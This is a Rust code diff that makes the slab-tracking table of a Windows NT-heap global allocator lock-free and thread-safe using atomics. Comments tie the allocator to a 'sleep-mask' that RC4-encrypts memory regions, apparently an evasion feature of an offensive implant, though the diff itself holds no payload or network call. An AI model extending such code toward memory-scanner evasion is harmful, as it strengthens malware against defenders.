@@ -12,7 +12,7 @@
 
 #![cfg(target_os = "windows")]
 
-use core::sync::atomic::{AtomicBool, AtomicU64, Ordering};
+use core::sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering};
 
 // ---- FFI types for the NT heap API ----
 
@@ -139,23 +139,56 @@ pub fn nt_alloc_addr() -> u64 {
 
 // ---- Slab tracking (for sleep-mask compatibility) ----
 
-#[derive(Clone, Copy)]
+/// One tracked large allocation. Fields are atomics so both writers (inside
+/// the `#[global_allocator]`, any thread) and the reader (`enumerate_slabs`
+/// on the sleep-mask path) are race-free with NO lock — allocators cannot
+/// take locks (reentrancy / perf). `AtomicU64` has the same layout as `u64`
+/// (8 bytes, 8-aligned), so the on-disk struct layout is unchanged.
 struct SlabDesc {
-    base: u64,
-    len: u64,
+    base: AtomicU64,
+    len: AtomicU64,
 }
 
 /// For sleep-mask: we track large allocations (> 64 KiB) individually, plus
 /// the heap base region. Small allocations are inside the heap's internal
 /// segments and are covered by the heap-base entry.
-static mut SLAB_TABLE: [SlabDesc; 256] = [SlabDesc { base: 0, len: 0 }; 256];
-static mut SLAB_COUNT: usize = 0;
+///
+/// Both the table and the counter are plain `static` (NOT `static mut`):
+/// `AtomicU64`/`AtomicUsize` are internally mutable, matching the `REGIONS`
+/// pattern in `mem.rs`. This is the global-allocator hot path — concurrent
+/// >64 KiB allocations from multiple threads are fully handled by `fetch_add`
+/// handing each writer a unique index (no torn writes, no lost updates, no
+/// OOB). See P0-1.
+static SLAB_TABLE: [SlabDesc; MAX_SLABS] = [
+    const {
+        SlabDesc {
+            base: AtomicU64::new(0),
+            len: AtomicU64::new(0),
+        }
+    };
+    MAX_SLABS
+];
+static SLAB_COUNT: AtomicUsize = AtomicUsize::new(0);
 
+/// Record a large allocation in the slab table. Called from inside
+/// `NtHeapAllocator::alloc` (the `#[global_allocator]`), so it is reachable
+/// from ANY thread and MUST be lock-free. `fetch_add` atomically reserves a
+/// unique index; once the table is full (`idx >= MAX_SLABS`) further tracks
+/// are silently dropped (never panic — a panic in the allocator is fatal).
+///
+/// # Safety (what's left of it)
+/// The `base`/`len` arguments must describe memory that will remain valid for
+/// the use `enumerate_slabs` makes of it (reading the stored integers). No
+/// dereference of `base` happens here.
 unsafe fn track_large_alloc(base: *mut u8, len: usize) {
-    let idx = SLAB_COUNT;
-    if idx < 256 {
-        SLAB_TABLE[idx] = SlabDesc { base: base as u64, len: len as u64 };
-        SLAB_COUNT = idx + 1;
+    // fetch_add gives each concurrent caller a unique index; the counter can
+    // grow past MAX_SLABS once the table fills (every caller past the cap
+    // lands in the `>= MAX_SLABS` drop branch). Clamp on the read side so a
+    // count > MAX_SLABS never indexes out of bounds.
+    let idx = SLAB_COUNT.fetch_add(1, Ordering::Relaxed);
+    if idx < MAX_SLABS {
+        SLAB_TABLE[idx].base.store(base as u64, Ordering::Release);
+        SLAB_TABLE[idx].len.store(len as u64, Ordering::Release);
     }
 }
 
@@ -164,19 +197,24 @@ unsafe fn track_large_alloc(base: *mut u8, len: usize) {
 /// pages and other executable regions, causing AV when mask() RC4-encrypts them).
 /// The sleep-mask's REGIONS table (registered via register_owned/register_key)
 /// is the primary mechanism for protecting sensitive data.
+///
+/// Lock-free and safe to race with `track_large_alloc`: each slot's base/len
+/// are independent atomics, and we read at most `count.min(MAX_SLABS)` slots.
+/// A slot mid-write (base set, len not yet) is skipped by the `!= 0` filter.
 pub fn enumerate_slabs() -> impl Iterator<Item = (*mut u8, usize)> {
-    unsafe {
-        let count = SLAB_COUNT;
-        let table = SLAB_TABLE;
-        (0..count).filter_map(move |i| {
-            let d = table[i];
-            if d.base != 0 && d.len != 0 {
-                Some((d.base as *mut u8, d.len as usize))
-            } else {
-                None
-            }
-        })
-    }
+    // Clamp count to MAX_SLABS: SLAB_COUNT is a monotonic fetch_add counter
+    // and can exceed MAX_SLABS once the table is full, but only the first
+    // MAX_SLABS slots are ever written.
+    let count = SLAB_COUNT.load(Ordering::Acquire).min(MAX_SLABS);
+    (0..count).filter_map(move |i| {
+        let base = SLAB_TABLE[i].base.load(Ordering::Acquire);
+        let len = SLAB_TABLE[i].len.load(Ordering::Acquire);
+        if base != 0 && len != 0 {
+            Some((base as *mut u8, len as usize))
+        } else {
+            None
+        }
+    })
 }
 
 /// Total bytes (approximate — returns the tracked heap region size).
